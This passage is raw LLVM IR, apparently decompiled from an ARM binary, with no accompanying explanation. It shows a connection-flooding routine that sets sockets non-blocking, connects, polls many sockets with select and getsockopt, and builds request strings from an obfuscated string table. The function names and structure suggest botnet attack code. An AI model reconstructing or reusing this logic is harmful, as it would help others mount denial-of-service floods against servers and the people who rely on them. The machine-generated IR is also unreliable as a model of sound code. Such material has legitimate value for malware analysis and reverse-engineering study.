  %v2_8674 = call i32 @__libc_fcntl(i32 %v3_8658, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_867c = or i32 %v2_8674, 2048
  store i32 %v1_867c, i32* @r2, align 4
  %v0_8680 = load i32, i32* @r4, align 4
  store i32 %v0_8680, i32* %r0.global-to-local, align 4
  %v2_8684 = call i32 @__libc_fcntl(i32 %v0_8680, i32 4)
  store i32 %v2_8684, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
  store i32 %v2_8694, i32* %r3.global-to-local, align 4
  %v0_8698 = load i32, i32* @r6, align 4
  %v1_8698 = add i32 %v0_8698, -1452
  %v2_8698 = inttoptr i32 %v1_8698 to i32*
  %v3_8698 = load i32, i32* %v2_8698, align 4
  store i32 %v3_8698, i32* %r0.global-to-local, align 4
  %v0_869c = load i32, i32* @r5, align 4
  store i32 %v0_869c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-44, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_86ac, i32* %r3.global-to-local, align 4
  %v5_86b4 = call i32 @__GI_setsockopt(i32 %v3_8698, i32 %v0_869c, i32 8, i32 %v2_86ac, i32 4)
  store i32 %v5_86b4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-20864.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v1_9e84, i32* %r2.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r6, align 4
  %v1_86c0 = add i32 %v0_86c0, -1436
  %v2_86c0 = inttoptr i32 %v1_86c0 to i32*
  %v3_86c0 = load i32, i32* %v2_86c0, align 4
  store i32 %v3_86c0, i32* @r4, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_86cc, i32* %r3.global-to-local, align 4
  %v1_86d0 = add i32 %v0_86c0, -1452
  %v2_86d0 = inttoptr i32 %v1_86d0 to i32*
  %v3_86d0 = load i32, i32* %v2_86d0, align 4
  store i32 %v3_86d0, i32* %r0.global-to-local, align 4
  %v3_86e0 = add i32 %v0_86c0, -1448
  %v4_86e0 = inttoptr i32 %v3_86e0 to i8*
  store i8 2, i8* %v4_86e0, align 1
  store i32 %v2_8530, i32* %r3.global-to-local, align 4
  %v0_86ec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_86ec, i32* %stack_var_-76, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v2_86f4, i32* %r1.global-to-local, align 4
  %v1_86f8 = load i32, i32* @r6, align 4
  %v2_86f8 = add i32 %v1_86f8, -1444
  %v3_86f8 = inttoptr i32 %v2_86f8 to i32*
  store i32 %v2_8530, i32* %v3_86f8, align 4
  %v3_86fc = call i32 @__libc_connect(i32 %v3_86d0, i32 %v2_86f4, i32 16)
  store i32 %v3_86fc, i32* %r0.global-to-local, align 4
  %v0_8700 = load i32, i32* @r6, align 4
  %v1_8700 = add i32 %v0_8700, -1452
  %v2_8700 = inttoptr i32 %v1_8700 to i32*
  %v3_8700 = load i32, i32* %v2_8700, align 4
  store i32 %v3_8700, i32* %ip.global-to-local, align 4
  %v3_8708 = udiv i32 %v3_8700, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_870c = mul nuw nsw i32 %v3_8708, 4
  store i32 %v3_870c, i32* %r2.global-to-local, align 4
  store i32 %v2_8710, i32* @lr, align 4
  br label %dec_label_pc_8718

dec_label_pc_8718:                                ; preds = %dec_label_pc_8d00, %dec_label_pc_866c
  %v0_8728 = phi i32 [ %v3_8700, %dec_label_pc_866c ], [ %v3_8d00, %dec_label_pc_8d00 ]
  %v3_870c.pn = phi i32 [ %v3_870c, %dec_label_pc_866c ], [ %v3_8d0c, %dec_label_pc_8d00 ]
  %storemerge = add i32 %v3_870c.pn, %v2_8710
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_8718 = add i32 %storemerge, -292
  %v2_8718 = inttoptr i32 %v1_8718 to i32*
  %v3_8718 = load i32, i32* %v2_8718, align 4
  %v1_871c = urem i32 %v0_8728, 32
  store i32 %v1_871c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8724 = shl i32 1, %v1_871c
  %v8_8724 = or i32 %v3_8718, %v7_8724
  store i32 %v8_8724, i32* %r1.global-to-local, align 4
  %v1_8728 = load i32, i32* @r8, align 4
  %v2_8728 = sub i32 %v0_8728, %v1_8728
  %v3_8728 = icmp uge i32 %v0_8728, %v1_8728
  store i1 %v3_8728, i1* %cpsr_c.global-to-local, align 1
  %v4_8728 = xor i32 %v1_8728, %v0_8728
  %v5_8728 = xor i32 %v2_8728, %v0_8728
  %v6_8728 = and i32 %v5_8728, %v4_8728
  %v7_8728 = icmp slt i32 %v6_8728, 0
  %v8_8728 = icmp slt i32 %v2_8728, 0
  %v9_8728 = icmp eq i32 %v0_8728, %v1_8728
  store i1 %v9_8728, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8724, i32* %v2_8718, align 4
  %v3_8730 = xor i1 %v8_8728, %v7_8728
  %v4_8730 = or i1 %v9_8728, %v3_8730
  br i1 %v4_8730, label %dec_label_pc_85f4, label %dec_label_pc_8734

dec_label_pc_8734:                                ; preds = %dec_label_pc_8718
  %v0_8734 = load i32, i32* %ip.global-to-local, align 4
  %v1_8734 = load i32, i32* %r3.global-to-local, align 4
  %v2_8734 = add i32 %v1_8734, %v0_8734
  store i32 %v2_8734, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8738:                                ; preds = %dec_label_pc_8fe0, %dec_label_pc_8f8c, %dec_label_pc_8d50, %dec_label_pc_8734
  %v0_875065 = phi i32 [ %v2_8fe0, %dec_label_pc_8fe0 ], [ %v2_8f8c, %dec_label_pc_8f8c ], [ %v2_8d50, %dec_label_pc_8d50 ], [ %v2_8734, %dec_label_pc_8734 ]
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_873c = load i32, i32* @r7, align 4
  %v1_873c = add i32 %v0_873c, 1
  store i32 %v1_873c, i32* @r7, align 4
  %v0_8740 = load i32, i32* @r6, align 4
  %v3_8744 = icmp uge i32 %v1_873c, %v0_839c
  store i1 %v3_8744, i1* %cpsr_c.global-to-local, align 1
  %v9_8744 = icmp eq i32 %v1_873c, %v0_839c
  store i1 %v9_8744, i1* %cpsr_z.global-to-local, align 1
  %v1_8748 = add i32 %v0_8740, 3140
  store i32 %v1_8748, i32* @r6, align 4
  br i1 %v9_8744, label %dec_label_pc_8750, label %dec_label_pc_860c

dec_label_pc_8750:                                ; preds = %dec_label_pc_8738, %dec_label_pc_85f4.dec_label_pc_8750_crit_edge
  %v0_8788 = phi i32 [ %v0_8750.pre, %dec_label_pc_85f4.dec_label_pc_8750_crit_edge ], [ %v0_875065, %dec_label_pc_8738 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8750 = icmp eq i32 %v0_8788, 0
  store i1 %v2_8750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8750, label %dec_label_pc_852c, label %dec_label_pc_8758

dec_label_pc_8758:                                ; preds = %dec_label_pc_8750
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-60, align 4
  store i32 %v2_8778, i32* %ip.global-to-local, align 4
  store i32 %v2_877c, i32* %r1.global-to-local, align 4
  store i32 %v2_8780, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_8788, i32* %r0.global-to-local, align 4
  %v5_8790 = call i32 @__libc_select(i32 %v0_8788, i32 %v2_877c, i32 %v2_8780, i32 0, i32 %v2_8778)
  store i32 %v5_8790, i32* @r4, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  store i32 %v0_8798, i32* %r0.global-to-local, align 4
  %v1_879c = inttoptr i32 %v0_8798 to i32*
  %v2_879c = call i32 @__GI_time(i32* %v1_879c)
  store i32 %v2_879c, i32* %r0.global-to-local, align 4
  %v0_87a0 = load i32, i32* @r4, align 4
  %v1_87a0 = load i32, i32* @r5, align 4
  %v3_87a0 = icmp uge i32 %v0_87a0, %v1_87a0
  store i1 %v3_87a0, i1* %cpsr_c.global-to-local, align 1
  %v9_87a0 = icmp eq i32 %v0_87a0, %v1_87a0
  store i1 %v9_87a0, i1* %cpsr_z.global-to-local, align 1
  %v7_87a8 = icmp sgt i32 %v0_87a0, %v1_87a0
  br i1 %v7_87a8, label %dec_label_pc_87ac, label %dec_label_pc_852c

dec_label_pc_87ac:                                ; preds = %dec_label_pc_8758
  %v0_880c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_880c

dec_label_pc_87b4:                                ; preds = %dec_label_pc_8820, %dec_label_pc_888c
  %v1_87c4 = phi i32 [ %v1_8838, %dec_label_pc_8820 ], [ %v1_87c4.pre, %dec_label_pc_888c ]
  %v0_87bc = phi i32 [ %v3_8828, %dec_label_pc_8820 ], [ %v0_87bc.pre, %dec_label_pc_888c ]
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  %v2_87bc = add i32 %v0_87bc, %v2_8710
  store i32 %v2_87bc, i32* %r2.global-to-local, align 4
  %v1_87c0 = add i32 %v2_87bc, -164
  %v2_87c0 = inttoptr i32 %v1_87c0 to i32*
  %v3_87c0 = load i32, i32* %v2_87c0, align 4
  %v2_87c4 = add i32 %v1_87c4, -1
  %v3_87c4 = shl i32 1, %v2_87c4
  %v4_87c4 = and i32 %v3_87c0, %v3_87c4
  %v5_87c4 = icmp ne i32 %v4_87c4, 0
  store i1 %v5_87c4, i1* %cpsr_c.global-to-local, align 1
  %v6_87c4 = ashr i32 %v3_87c0, %v1_87c4
  store i32 %v6_87c4, i32* %r3.global-to-local, align 4
  %v1_87c8 = urem i32 %v6_87c4, 2
  %v2_87c8 = icmp eq i32 %v1_87c8, 0
  store i1 %v2_87c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_87c8, label %dec_label_pc_87ec, label %dec_label_pc_87d0

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87b4
  %v0_87d0 = load i32, i32* @sl, align 4
  %v1_87d0 = add i32 %v0_87d0, -1448
  %v2_87d0 = inttoptr i32 %v1_87d0 to i8*
  %v3_87d0 = load i8, i8* %v2_87d0, align 1
  %v4_87d0 = zext i8 %v3_87d0 to i32
  store i32 %v4_87d0, i32* %r3.global-to-local, align 4
  %v2_87d4 = icmp ugt i8 %v3_87d0, 5
  store i1 %v2_87d4, i1* %cpsr_c.global-to-local, align 1
  %v7_87d4 = icmp eq i8 %v3_87d0, 6
  store i1 %v7_87d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87d4, label %dec_label_pc_9028, label %dec_label_pc_87dc

dec_label_pc_87dc:                                ; preds = %dec_label_pc_87d0
  %v2_87dc = icmp ugt i8 %v3_87d0, 6
  store i1 %v2_87dc, i1* %cpsr_c.global-to-local, align 1
  %v7_87dc = icmp eq i8 %v3_87d0, 7
  store i1 %v7_87dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87dc, label %dec_label_pc_8d58, label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87dc
  %v2_87e4 = icmp ugt i8 %v3_87d0, 9
  store i1 %v2_87e4, i1* %cpsr_c.global-to-local, align 1
  %v7_87e4 = icmp eq i8 %v3_87d0, 10
  store i1 %v7_87e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87e4, label %dec_label_pc_9660, label %dec_label_pc_87ec

dec_label_pc_87ec:                                ; preds = %dec_label_pc_8e58, %dec_label_pc_96f0, %dec_label_pc_96a0, %dec_label_pc_9078, %dec_label_pc_87e4, %dec_label_pc_87b4, %dec_label_pc_880c, %dec_label_pc_9b40, %dec_label_pc_99ec, %dec_label_pc_9974, %dec_label_pc_9918, %dec_label_pc_96fc, %dec_label_pc_96cc, %dec_label_pc_96b0, %dec_label_pc_9654, %dec_label_pc_9550, %dec_label_pc_8f94
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_87f4 = add i32 %stack_var_-20820.0, 1
  store i32 %v1_87f4, i32* %r2.global-to-local, align 4
  %v0_87f8 = load i32, i32* @sl, align 4
  %v3_87fc = icmp uge i32 %v1_87f4, %v0_839c
  store i1 %v3_87fc, i1* %cpsr_c.global-to-local, align 1
  %v9_87fc = icmp eq i32 %v1_87f4, %v0_839c
  store i1 %v9_87fc, i1* %cpsr_z.global-to-local, align 1
  %v1_8804 = add i32 %v0_87f8, 3140
  store i32 %v1_8804, i32* @sl, align 4
  br i1 %v9_87fc, label %dec_label_pc_852c, label %dec_label_pc_880c

dec_label_pc_880c:                                ; preds = %dec_label_pc_87ec, %dec_label_pc_87ac
  %v0_880c = phi i32 [ %v0_880c.pre, %dec_label_pc_87ac ], [ %v1_8804, %dec_label_pc_87ec ]
  %stack_var_-20820.0 = phi i32 [ %v1_87a0, %dec_label_pc_87ac ], [ %v1_87f4, %dec_label_pc_87ec ]
  %v1_880c = add i32 %v0_880c, -1452
  %v2_880c = inttoptr i32 %v1_880c to i32*
  %v3_880c = load i32, i32* %v2_880c, align 4
  store i32 %v3_880c, i32* %r0.global-to-local, align 4
  %v2_8814 = icmp eq i32 %v3_880c, -1
  store i1 %v2_8814, i1* %cpsr_c.global-to-local, align 1
  %v7_8814 = icmp eq i32 %v3_880c, -1
  store i1 %v7_8814, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_880c, i32* %sb.global-to-local, align 4
  br i1 %v7_8814, label %dec_label_pc_87ec, label %dec_label_pc_8820

dec_label_pc_8820:                                ; preds = %dec_label_pc_880c
  %v3_8820 = udiv i32 %v3_880c, 32
  %v3_8828 = mul nuw nsw i32 %v3_8820, 4
  store i32 %v3_8828, i32* @ip, align 4
  store i32 %v2_8710, i32* @lr, align 4
  %v2_8830 = add i32 %v3_8828, %v2_8710
  store i32 %v2_8830, i32* %r2.global-to-local, align 4
  %v1_8834 = add i32 %v2_8830, -292
  %v2_8834 = inttoptr i32 %v1_8834 to i32*
  %v3_8834 = load i32, i32* %v2_8834, align 4
  %v1_8838 = urem i32 %v3_880c, 32
  store i32 %v1_8838, i32* %r1.global-to-local, align 4
  %v2_883c = add nsw i32 %v1_8838, -1
  %v3_883c = shl i32 1, %v2_883c
  %v4_883c = and i32 %v3_8834, %v3_883c
  %v5_883c = icmp ne i32 %v4_883c, 0
  store i1 %v5_883c, i1* %cpsr_c.global-to-local, align 1
  %v6_883c = ashr i32 %v3_8834, %v1_8838
  store i32 %v6_883c, i32* %r3.global-to-local, align 4
  %v1_8840 = urem i32 %v6_883c, 2
  %v2_8840 = icmp eq i32 %v1_8840, 0
  store i1 %v2_8840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8840, label %dec_label_pc_87b4, label %dec_label_pc_8848

dec_label_pc_8848:                                ; preds = %dec_label_pc_8820
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_8860, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 4, i32* %stack_var_-52, align 4
  store i32 %v2_886c, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_8878 = call i32 @getsockopt(i32 %v3_880c, i32 1, i32 4, i32 %v2_8860, i32 %v2_886c)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8880 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_8880, i32* %r3.global-to-local, align 4
  %v2_8884 = or i32 %v3_8880, %v5_8878
  store i32 %v2_8884, i32* %r0.global-to-local, align 4
  %v4_8884 = icmp eq i32 %v2_8884, 0
  store i1 %v4_8884, i1* %cpsr_z.global-to-local, align 1
  %v0_888c = load i32, i32* @sl, align 4
  %v1_888c = add i32 %v0_888c, -1452
  %v2_888c = inttoptr i32 %v1_888c to i32*
  %v3_888c = load i32, i32* %v2_888c, align 4
  br i1 %v4_8884, label %dec_label_pc_888c, label %dec_label_pc_8f94

dec_label_pc_888c:                                ; preds = %dec_label_pc_8848
  store i32 %v3_888c, i32* %r3.global-to-local, align 4
  %v3_8890 = udiv i32 %v3_888c, 32
  store i32 %v3_8890, i32* %r2.global-to-local, align 4
  %v1_8894 = urem i32 %v3_888c, 32
  store i32 %v1_8894, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8898 = mul nuw nsw i32 %v3_8890, 4
  store i32 %v3_8898, i32* @ip, align 4
  %v0_889c = load i32, i32* @r4, align 4
  %v1_889c = trunc i32 %v0_889c to i8
  %v3_889c = add i32 %v0_888c, -1448
  %v4_889c = inttoptr i32 %v3_889c to i8*
  store i8 %v1_889c, i8* %v4_889c, align 1
  %v0_87bc.pre = load i32, i32* @ip, align 4
  %v1_87c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_87b4

dec_label_pc_88a4:                                ; preds = %dec_label_pc_860c
  %v1_88a4 = add i32 %v3_88b0, 4
  %v2_88a4 = inttoptr i32 %v1_88a4 to i32*
  %v3_88a4 = load i32, i32* %v2_88a4, align 4
  store i32 %v3_88a4, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_88a8 = icmp eq i32 %v3_88a4, 0
  store i1 %v2_88a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_88a8, label %.thread19, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_88a4
  store i32 4, i32* @r3, align 4
  store i8 4, i8* %v2_860c, align 1
  %v0_88b4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_88b4.pr.pr, label %.thread17..thread19_crit_edge, label %dec_label_pc_88bc

.thread17..thread19_crit_edge:                    ; preds = %.thread17
  %v1_88b4.pre = load i32, i32* @r3, align 4
  %v3_88b4.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_88b4.pre to i8
  br label %.thread19

.thread19:                                        ; preds = %.thread17..thread19_crit_edge, %dec_label_pc_88a4
  %v3_88b4 = phi i32 [ %v3_88b4.pre, %.thread17..thread19_crit_edge ], [ %v3_88b0, %dec_label_pc_88a4 ]
  %v1_88b4.off0 = phi i8 [ %extract.t, %.thread17..thread19_crit_edge ], [ 0, %dec_label_pc_88a4 ]
  %v4_88b4 = add i32 %v3_88b4, -1448
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 %v1_88b4.off0, i8* %v5_88b4, align 1
  %v0_88b8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_88b8.pr, label %.thread19.dec_label_pc_8628_crit_edge, label %dec_label_pc_88bc

.thread19.dec_label_pc_8628_crit_edge:            ; preds = %.thread19
  %v0_8628.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8628

dec_label_pc_88bc:                                ; preds = %.thread17, %dec_label_pc_85b4, %.thread19
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  %v0_88c4 = load i32, i32* @r5, align 4
  %v1_88c4 = add i32 %v0_88c4, 2112
  store i32 %v1_88c4, i32* %r0.global-to-local, align 4
  %v1_88c8 = load i32, i32* @r6, align 4
  %v2_88c8 = add i32 %v1_88c8, 12
  %v3_88c8 = inttoptr i32 %v2_88c8 to i32*
  store i32 -1, i32* %v3_88c8, align 4
  %v0_88cc = load i32, i32* %r0.global-to-local, align 4
  %v1_88cc = add i32 %v0_88cc, 4
  store i32 %v1_88cc, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_88d4 = load i32, i32* %sb.global-to-local, align 4
  %v1_88d4 = load i32, i32* @r6, align 4
  %v2_88d4 = inttoptr i32 %v1_88d4 to i32*
  store i32 %v0_88d4, i32* %v2_88d4, align 4
  %v2_88d8 = call i32 @util_zero(i32 %v1_88cc, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_88e4 = load i32, i32* %sb.global-to-local, align 4
  %v1_88e4 = load i32, i32* @r6, align 4
  %v2_88e4 = add i32 %v1_88e4, 660
  %v3_88e4 = inttoptr i32 %v2_88e4 to i32*
  store i32 %v0_88e4, i32* %v3_88e4, align 4
  %v2_88e8 = call i32 @util_zero(i32 %stack_var_-20860.0.ph, i32 10240)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88f0 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_88f4 = load i32, i32* @r5, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_88fc = add i32 %v0_88f4, 1431
  store i32 %v1_88fc, i32* %fp.global-to-local, align 4
  %v2_8900 = add i32 %v2_88f0, %stack_var_-20860.0.ph
  store i32 %v2_8900, i32* @r0, align 4
  store i32 %v1_88fc, i32* %r1.global-to-local, align 4
  %v2_8908 = inttoptr i32 %v2_8900 to i8*
  %v3_8908 = call i32 @util_strcpy(i8* %v2_8908, i32 %v1_88fc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8910 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1b3e0.37 to i32), i32* %r1.global-to-local, align 4
  %v2_891c = add i32 %v2_8910, %stack_var_-20860.0.ph
  store i32 %v2_891c, i32* @r0, align 4
  %v2_8920 = inttoptr i32 %v2_891c to i8*
  %v3_8920 = call i32 @util_strcpy(i8* %v2_8920, i32 ptrtoint (i32* @global_var_1b3e0.37 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8928 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8930 = add i32 %v2_8928, %stack_var_-20860.0.ph
  store i32 %v2_8930, i32* @r0, align 4
  %v0_8934 = load i32, i32* @r5, align 4
  %v1_8934 = add i32 %v0_8934, 532
  store i32 %v1_8934, i32* %r1.global-to-local, align 4
  %v2_8938 = inttoptr i32 %v2_8930 to i8*
  %v3_8938 = call i32 @util_strcpy(i8* %v2_8938, i32 %v1_8934)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8940 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1b3b8.39 to i32), i32* %r1.global-to-local, align 4
  %v2_894c = add i32 %v2_8940, %stack_var_-20860.0.ph
  store i32 %v2_894c, i32* @r0, align 4
  %v3_8950 = inttoptr i32 %v2_894c to i8*
  %v4_8950 = call i32 @util_strcpy(i8* %v3_8950, i32 ptrtoint ([24 x i8]* @global_var_1b3b8.39 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8958 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v1_8960 = add i32 %v0_8960, 20
  store i32 %v1_8960, i32* %r1.global-to-local, align 4
  %v2_8964 = add i32 %v2_8958, %stack_var_-20860.0.ph
  store i32 %v2_8964, i32* @r0, align 4
  %v2_8968 = inttoptr i32 %v2_8964 to i8*
  %v3_8968 = call i32 @util_strcpy(i8* %v2_8968, i32 %v1_8960)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8970 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b3d0.41 to i32), i32* %r1.global-to-local, align 4
  %v2_897c = add i32 %v2_8970, %stack_var_-20860.0.ph
  store i32 %v2_897c, i32* @r0, align 4
  %v3_8980 = inttoptr i32 %v2_897c to i8*
  %v4_8980 = call i32 @util_strcpy(i8* %v3_8980, i32 ptrtoint ([9 x i8]* @global_var_1b3d0.41 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8988 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  %v0_8990 = load i32, i32* @r5, align 4
  %v2_8994 = add i32 %v2_8988, %stack_var_-20860.0.ph
  store i32 %v2_8994, i32* @r0, align 4
  %v1_8998 = add i32 %v0_8990, 789
  store i32 %v1_8998, i32* %r1.global-to-local, align 4
  %v2_899c = inttoptr i32 %v2_8994 to i8*
  %v3_899c = call i32 @util_strcpy(i8* %v2_899c, i32 %v1_8998)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89a4 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_89ac = add i32 %v2_89a4, %stack_var_-20860.0.ph
  store i32 %v2_89ac, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  %v3_89b4 = inttoptr i32 %v2_89ac to i8*
  %v4_89b4 = call i32 @util_strcpy(i8* %v3_89b4, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_89bc = call i32 @table_unlock_val(i32 32)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89c4 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_89c8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_89c8, i32* %r1.global-to-local, align 4
  store i32 %v2_89c4, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_89d4 = inttoptr i32 %v0_89c8 to i32*
  %v3_89d4 = call i32 @table_retrieve_val(i32 32, i32* %v2_89d4)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_89d4, i32* %r1.global-to-local, align 4
  %v1_89e0 = load i32, i32* @r4, align 4
  %v2_89e0 = add i32 %v1_89e0, %stack_var_-20860.0.ph
  store i32 %v2_89e0, i32* @r0, align 4
  %v2_89e4 = inttoptr i32 %v2_89e0 to i8*
  %v3_89e4 = call i32 @util_strcpy(i8* %v2_89e4, i32 %v3_89d4)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_89ec = call i32 @table_lock_val(i32 32)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89f4 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8a00 = add i32 %v2_89f4, %stack_var_-20860.0.ph
  store i32 %v2_8a00, i32* @r0, align 4
  %v3_8a04 = inttoptr i32 %v2_8a00 to i8*
  %v4_8a04 = call i32 @util_strcpy(i8* %v3_8a04, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_8a0c = call i32 @table_unlock_val(i32 33)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a14 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8a18 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a18, i32* %r1.global-to-local, align 4
  store i32 %v2_8a14, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_8a24 = inttoptr i32 %v0_8a18 to i32*
  %v3_8a24 = call i32 @table_retrieve_val(i32 33, i32* %v2_8a24)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_8a24, i32* %r1.global-to-local, align 4
  %v1_8a30 = load i32, i32* @r4, align 4
  %v2_8a30 = add i32 %v1_8a30, %stack_var_-20860.0.ph
  store i32 %v2_8a30, i32* @r0, align 4
  %v2_8a34 = inttoptr i32 %v2_8a30 to i8*
  %v3_8a34 = call i32 @util_strcpy(i8* %v2_8a34, i32 %v3_8a24)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_8a3c = call i32 @table_lock_val(i32 33)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a44 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8a50 = add i32 %v2_8a44, %stack_var_-20860.0.ph
  store i32 %v2_8a50, i32* @r0, align 4
  %v3_8a54 = inttoptr i32 %v2_8a50 to i8*
  %v4_8a54 = call i32 @util_strcpy(i8* %v3_8a54, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8a5c = call i32 @table_unlock_val(i32 34)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a64 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8a68 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a68, i32* %r1.global-to-local, align 4
  store i32 %v2_8a64, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_8a74 = inttoptr i32 %v0_8a68 to i32*
  %v3_8a74 = call i32 @table_retrieve_val(i32 34, i32* %v2_8a74)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8a74, i32* %r1.global-to-local, align 4
  %v1_8a80 = load i32, i32* @r4, align 4
